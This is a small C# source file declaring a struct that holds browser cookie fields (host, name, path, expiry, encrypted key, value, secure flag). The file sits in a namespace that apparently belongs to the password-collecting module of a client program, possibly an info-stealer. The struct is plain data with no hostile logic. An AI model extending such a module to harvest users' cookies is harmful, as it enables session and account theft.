namespace Client.Modules.Passwords.Helpers;

internal struct Cookie
{
	public string sHostKey { get; set; }

	public string sName { get; set; }

	public string sPath { get; set; }

	public string sExpiresUtc { get; set; }

	public string sKey { get; set; }

	public string sValue { get; set; }

	public string sIsSecure { get; set; }
}
